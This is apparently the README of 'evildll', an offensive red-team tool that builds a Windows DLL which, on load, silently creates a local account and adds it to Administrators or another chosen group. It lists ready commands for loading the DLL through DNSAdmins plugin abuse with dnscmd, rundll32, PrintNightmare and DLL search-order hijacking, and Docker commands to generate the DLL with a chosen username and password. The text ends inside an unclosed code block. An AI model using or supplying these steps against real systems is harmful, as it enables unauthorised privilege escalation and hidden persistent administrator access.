# evildll
**Multi-Purpose Windows Persistence / Privilege Escalation DLL**

One single DLL, multiple loading techniques.  
Designed for red team operations when you already have a user that is member of the **DNSAdmins** group (or when you are exploiting PrintNightmare, COM/DLL hijacking, etc.).

## What the DLL does on load
As soon as the DLL is loaded by any process (dns.exe, printfilterpipelinesvc.exe, rundll32.exe, etc.), it silently:
1. Creates a local account with the username and password you chose
2. Adds it to the desired local group (`Administrators`, `Remote Desktop Users`, etc.)

## Supported loading techniques

| Method                          | Example command                                                                                          | Requirements                              |
|---------------------------------|----------------------------------------------------------------------------------------------------------|-------------------------------------------|
| DNSAdmins (DNS Server plugin)   | `dnscmd.exe /config /serverlevelplugindll C:\temp\evil.dll` + restart DNS service                        | Member of DNSAdmins group                 |
| PrintNightmare (CVE-2021-34527 / CVE-2021-1675)                                                                                            | RPC access + reachable authenticated SMB share |
| rundll32.exe                    | `rundll32.exe evil.dll,EntryPoint`                                                                       | Command execution                         |
| COM / DLL Search Order hijacking| Copy the DLL into a directory loaded by a vulnerable service                                             | Write permission in the target directory  |

## Quick build with Docker (recommended)

```bash
# Clone the repo
git clone https://github.com/CobblePot59/evildll.git
cd evildll

# Build the image once
docker build -t evildll .

# Generate your DLL in ~2 seconds
docker run --rm -v .:/out evildll \
    -u evilprint \
    -p 'Password1' \
    -g "Administrators" \
    -o evil.dll